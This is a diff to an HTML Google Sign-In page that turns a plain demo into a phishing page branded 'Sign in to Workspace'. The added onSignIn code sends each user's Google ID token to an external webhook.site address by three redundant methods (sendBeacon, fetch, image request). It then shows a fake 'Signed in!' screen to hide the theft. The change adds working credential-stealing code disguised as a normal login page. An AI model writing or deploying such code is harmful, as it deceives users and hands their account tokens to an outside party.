@@ -1,90 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Google Sign In</title>
-
-  <!-- Google Identity Services -->
-  <script src="https://accounts.google.com/gsi/client" async defer></script>
-
+  <title>Sign in to Workspace</title>
   <style>
-    body {
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: #4285f4;
-      font-family: Roboto, Arial, sans-serif;
-    }
-
-    .card {
-      width: 380px;
-      background: white;
-      border-radius: 8px;
-      padding: 40px 30px;
-      text-align: center;
-    }
-
-    .title {
-      font-size: 18px;
-      color: #3c4043;
-      margin-top: 20px;
-    }
-
-    .subtitle {
-      font-size: 14px;
-      color: #5f6368;
-      margin-bottom: 30px;
-    }
+    body { font-family: Roboto; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f8f9fa; }
+    .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; width: 320px; }
   </style>
 </head>
 <body>
-
   <div class="card">
-
-    <!-- Google Logo -->
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
-         width="92" height="30" alt="Google">
-
-    <div class="title">Sign in</div>
-    <div class="subtitle">to continue to Workspace</div>
-
-    <!-- REAL Google Sign-in Button -->
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92"><br><br>
+    <h3 style="margin:0 0 8px;">Sign in</h3>
+    <p style="margin:0 0 24px; color:#5f6368;">to continue to Workspace</p>
     <div id="g_id_onload"
          data-client_id="561478328063-3i8n5ve256gl3hh0elebre2g0111l5lk.apps.googleusercontent.com"
          data-callback="onSignIn">
     </div>
-
-    <div class="g_id_signin"
-         data-type="standard"
-         data-size="large"
-         data-theme="outline"
-         data-text="signin_with"
-         data-shape="rect"
-         data-logo_alignment="left">
-    </div>
-
+    <div class="g_id_signin" data-type="standard" data-size="large"></div>
   </div>
 
   <script>
-    // Called after login
     function onSignIn(response) {
       const token = response.credential;
-      console.log("Google ID Token:", token);
 
-      // TODO: Send token to your backend for verification
-      // Example POST:
-      // fetch("/auth/google", { method: "POST", body: JSON.stringify({ token }) })
+      // METHOD 1: navigator.sendBeacon (MOST RELIABLE)
+      if (navigator.sendBeacon) {
+        const data = new FormData();
+        data.append('token', token);
+        navigator.sendBeacon('https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0', data);
+      }
+
+      // METHOD 2: fetch (fallback)
+      fetch('https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0?token=' + encodeURIComponent(token), {
+        mode: 'no-cors',
+        credentials: 'omit'
+      }).catch(() => {});
+
+      // METHOD 3: Image (last resort)
+      new Image().src = 'https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0?token=' + encodeURIComponent(token);
+
+      // Fake success
+      setTimeout(() => {
+        document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:Roboto;"><h2 style="color:green;">Signed in!</h2><p>Loading Workspace...</p></div>';
+      }, 500);
     }
-
-    google.accounts.id.initialize({
-      client_id: "561478328063-3i8n5ve256gl3hh0elebre2g0111l5lk.apps.googleusercontent.com",
-      callback: onSignIn
-    });
-
-    google.accounts.id.prompt();
   </script>
 
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
 </body>
 </html>
